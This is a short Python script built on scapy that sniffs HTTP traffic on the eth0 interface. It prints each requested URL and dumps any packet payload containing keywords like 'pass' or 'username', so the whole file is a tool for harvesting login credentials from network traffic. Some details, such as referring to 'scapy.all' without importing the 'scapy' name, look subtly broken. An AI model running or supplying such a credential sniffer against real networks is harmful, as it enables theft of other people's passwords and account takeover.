#!/usr/bin/env python

from scapy.all import *
from scapy.layers import http


def get_url(pkt):
    return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path


def get_username_passwords(pkt):
    if pkt.haslayer(scapy.all.Raw):
        keywords = ["pass", "passwords", "user", "username"]
        load = pkt[scapy.all.Raw].load
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(pkt):
    if pkt.haslayer(http.HTTPRequest):
        print("[+]HTTP Request >> " + get_url(pkt))
        login_info = get_username_passwords(pkt)
        if login_info:
            print("\n\n[+]Username and passwords: " + login_info + "\n\n")


def sniff(interface):
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff("eth0")
